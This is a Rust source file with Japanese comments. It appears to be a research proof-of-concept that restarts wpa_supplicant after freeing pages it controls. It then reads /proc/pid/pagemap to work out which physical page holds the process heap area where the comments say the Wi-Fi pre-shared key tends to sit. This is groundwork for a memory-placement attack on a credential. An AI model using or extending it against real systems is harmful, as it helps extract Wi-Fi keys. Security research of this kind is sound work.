use std::process::{id, Command, Stdio};
use std::ptr::null_mut;
use std::{time, fs::File, io::{Read, Seek, SeekFrom}, mem::size_of};
use pagemap::maps;
use libc::{c_void, mmap, munmap, sched_yield, sysconf, _SC_PAGESIZE};

const DUMMY_PAGES: usize = 300;
const BUSY_LOOP: u64 = 5;
const PROCESS_NAME: &str = "wpa_supplicant";
const WPA_SUPPLICANT_PATH: &str = "/home/inoue/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant";
const CONFIG_PATH: &str = "-c/home/inoue/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant.conf";
const INTERFACE: &str = "-iwlx00c0ca991249";

fn main() {
    if get_process_id(PROCESS_NAME) > 0 {
        kill_wpa_supplicant();
    }

    // dummy page を確保
    let mut dummy_pages: Vec<(*mut c_void, u64)> = Vec::new();
    for _ in 0..DUMMY_PAGES {
        dummy_pages.push(allocate_dummy_pages());
    }
    
    for _ in 0..10 {
        unsafe { sched_yield(); }
    }

    // dummy page を解放
    release_dummy_pages(&dummy_pages);

    // wpa_supplicant を起動 起動後少し待機
    start_wpa_supplicant();

    println!("[+] start busy loop");
    let now = time::Instant::now();
    loop {
        if now.elapsed().as_secs() > BUSY_LOOP { break; }
    }
    println!("[+] end busy loop");

    let pid = get_process_id(PROCESS_NAME);
    println!("[+] pid = {}", pid);

    // wpa_supplicant の heap 領域の先頭アドレス
    let base_addr = get_heap_start_address(pid as u64);
    println!("[+] base_addr = {:x}", base_addr);

    // PSK は base_addr から 0x5 ページ後ろに置かれることが多い
    let psk_addr = (base_addr + 0x5000) as *const c_void;
    println!("[+] psk_addr = {:p}", psk_addr);

    // PSK が配置されたページの物理ページ番号を計算
    let page_frame_number = v2p(pid as u64, psk_addr) as u64;
    println!("[+] page_frame_number = {:x}", page_frame_number);

    calc_dummy_page(&dummy_pages, page_frame_number);

}

fn get_process_id(process_name: &str) -> i32 {
    let ps = Command::new("ps").arg("aux").stdout(Stdio::piped()).spawn().expect("ps failed");
    let grep = Command::new("grep").arg(process_name).stdin(ps.stdout.unwrap()).output().expect("grep failed");
    let mut pid = 0;
    for line in String::from_utf8(grep.stdout).unwrap().lines() {
        if !line.contains("grep") {
            let res: Vec<&str> = line.split_whitespace().collect();
            pid = res[1].parse::<i32>().unwrap();
        }
    }
    pid
}

fn start_wpa_supplicant() {
    let cmd = Command::new(WPA_SUPPLICANT_PATH).arg(INTERFACE).arg(CONFIG_PATH).arg("-B").stdout(Stdio::null()).status().expect("failed to start wpa_supplicant");
    if !cmd.success() {
        panic!("[-] failed to start wpa_supplicant");
    }
    println!("[+] start wpa_supplicant");
}

fn kill_wpa_supplicant() {
    let cmd = Command::new("killall").arg("wpa_supplicant").status().expect("killall failed");
    if !cmd.success() {
        panic!("[-] failed to kill wpa_supplicant");
    }
    println!("[+] kill wpa_supplicant");
}

fn get_heap_start_address(pid: u64) -> u64 {
    let map = maps(pid).unwrap();
    let mut res = 0;
    for m in map {
        if m.path() == Some("[heap]") {
            res = m.memory_region().start_address();
            break;
        }
    }
    res
}

fn v2p(pid: u64, virt_addr: *const c_void) -> usize {
    // ページサイズを計算 (基本 4KiB)
    let page_size = match unsafe { sysconf(_SC_PAGESIZE) } {
        -1 => 4096,
        sz => sz as u64,
    };

    // 仮想アドレスのページ番号を計算
    let virt_pfn = virt_addr as u64 / page_size;

    // 仮想アドレスのページ内オフセットを計算
    let offset = virt_addr as u64 % page_size;

    // 物理ページ番号 (55bit) を格納するバッファ
    let mut buff = [0; 8];

    let page_map_path = format!("/proc/{}/pagemap", pid);
    let mut file = File::open(page_map_path).unwrap();
    
    // 仮想アドレスページ番号の分だけカーソルを進める
    file.seek(SeekFrom::Start(size_of::<u64>() as u64 * virt_pfn)).unwrap();

    // 8x8=64bit 取得
    file.read_exact(&mut buff).unwrap();

    // 物理ページ番号を計算
    let mut pfn = 0;
    for (index, val) in buff.iter().enumerate() {
        pfn += (*val as usize) << (index * 8); 
    }

    match pfn & 0x7fffffffffffff {
        0 => 0,
        p => p * page_size as usize + offset as usize,
    }
}

fn allocate_dummy_pages() -> (*mut c_void, u64) {
    let pid = id() as u64;
    let mem: *mut c_void = unsafe {
        mmap(
            null_mut(),
            0x1000,
            libc::PROT_READ | libc::PROT_WRITE,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE | libc::MAP_POPULATE,
            -1,
            0
        )
    };
    let physical_address = v2p(pid, mem) as u64;
    (mem, physical_address)
}

fn release_dummy_pages(dummy_pages: &[(*mut c_void, u64)]) {
    for page in dummy_pages {
        unsafe {
            munmap(page.0, 0x1000);
        }
    }
}

fn calc_dummy_page(dummy_pages: &[(*mut c_void, u64)], pfn: u64) {
    for (index, p) in dummy_pages.iter().enumerate() {
        if p.1 == pfn {
            println!("[+] found dummy page at dummy_pages[{}]", index);
            println!("[+] so, dummy page = {}", DUMMY_PAGES - index - 1);
            break;
        }
    }
}
